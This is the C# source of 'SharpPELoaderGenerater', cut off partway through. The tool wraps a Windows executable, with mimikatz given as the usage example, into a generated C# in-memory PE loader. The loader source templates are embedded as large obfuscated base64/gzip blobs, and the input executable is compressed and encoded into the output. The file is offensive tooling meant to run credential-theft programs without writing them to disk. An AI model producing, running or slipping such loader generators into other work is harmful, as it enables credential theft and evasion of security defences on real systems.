using System;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;

namespace GenerateSharpPELoader
{
    class Program
    {
        static byte[] Compress(byte[] raw)
        {
            using (MemoryStream memory = new MemoryStream())
            {
                using (GZipStream gzip = new GZipStream(memory,
                CompressionMode.Compress, true))
                {
                    gzip.Write(raw, 0, raw.Length);
                }
                return memory.ToArray();
            }
        }

        static byte[] Decompress(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }
        static void Main(string[] args)
        {
            string Usage = @"
SharpPELoaderGenerater
Use to generate SharpPELoader.cs
Modified by 3gstudent
Reference:Casey Smith's PELoader.cs

Usage:
      SharpPELoaderGenerater.exe <exe path>
Eg.
      SharpPELoaderGenerater.exe mimikatz.exe

SharpPELoaderGenerater will determine whether the exe is 32-bit or 64-bit and then generate the corresponding code.
            ";
            if(args.Length !=1)
            {
                Console.WriteLine(Usage);
                Environment.Exit(0);
            }

            PELoader pe = new PELoader(args[0].ToString());
            if (pe.Is32BitHeader)
            {
                Console.WriteLine("[+] 32 bit of PE");
                Console.WriteLine("[*] Try to generate SharpPELoader_x86.cs");
                string source1compress_x86 = @"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";
                byte[] data1 = System.Convert.FromBase64String(source1compress_x86);
                byte[] decompressed1 = Decompress(data1);
                string source1_x86 = System.Text.Encoding.Default.GetString(decompressed1);

                byte[] AsBytes1 = File.ReadAllBytes(args[0].ToString());
                byte[] compress1 = Compress(AsBytes1);
                string source2_x86 = Convert.ToBase64String(compress1);

                string source3_x86 = "\";\r\n    }\r\n } ";
                StreamWriter sw1 = new StreamWriter(@"SharpPELoader_x86.cs");
                sw1.Write(source1_x86 + source2_x86 + source3_x86);
                sw1.Close();

            }
            else
            {
                Console.WriteLine("[+] 64 bit of PE");
                Console.WriteLine("[*] Try to generate SharpPELoader_x64.cs");
                string source1compress_x64 = @"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";

                byte[] data2 = System.Convert.FromBase64String(source1compress_x64);
                byte[] decompressed2 = Decompress(data2);
                string source1_x64 = System.Text.Encoding.Default.GetString(decompressed2);

                byte[] AsBytes2 = File.ReadAllBytes(args[0].ToString());
                byte[] compress2 = Compress(AsBytes2);
                string source2_x64 = Convert.ToBase64String(compress2);

